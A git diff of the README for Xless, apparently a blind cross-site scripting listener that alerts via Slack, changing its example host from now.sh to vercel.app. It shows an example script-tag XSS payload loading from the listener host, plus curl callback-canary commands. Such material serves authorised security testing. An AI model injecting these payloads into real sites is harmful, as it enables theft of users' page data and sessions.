@@ -31,7 +31,7 @@ That's it. You now have a fully-running Blind XSS listener that uses Slack to no
 $ bash deploy.sh
 
 > Deploying ~/xless under X
-> https://xless.now.sh [v2] [in clipboard] [4s]
+> https://xless.vercel.app [v2] [in clipboard] [4s]
 > Success! Deployment ready [4s]
 ```
 2. Use the URL for blind XSS testing :fire:
@@ -42,7 +42,7 @@ $ bash deploy.sh
 ## :speech_balloon: Example Payload
 
 ```html
-<script src="https://xless.now.sh"></script>
+<script src="https://xless.vercel.app"></script>
 ```
 
 
@@ -70,7 +70,7 @@ Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS reque
 ## :eyes: Demo
 
 ```bash
-$ curl https://xless.now.sh/callback-canary
+$ curl https://xless.vercel.app/callback-canary
 ```
 
 ![OOB CallBack Listener Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot-oob-callback-example.png)
@@ -78,14 +78,14 @@ $ curl https://xless.now.sh/callback-canary
 Or anything random, such as:
 
 ```bash
-$ curl https://xless.now.sh/88bf0ecd
+$ curl https://xless.vercel.app/88bf0ecd
 ```
 
 
 ##  Example Blind XSS payloads
 
 You can view a number of handy XSS payloads for your xless app at `$URL/examples`
-* URL: `https://xless.now.sh/examples`
+* URL: `https://xless.vercel.app/examples`
 Once you deploy your app, you can find the examples there.
 
 
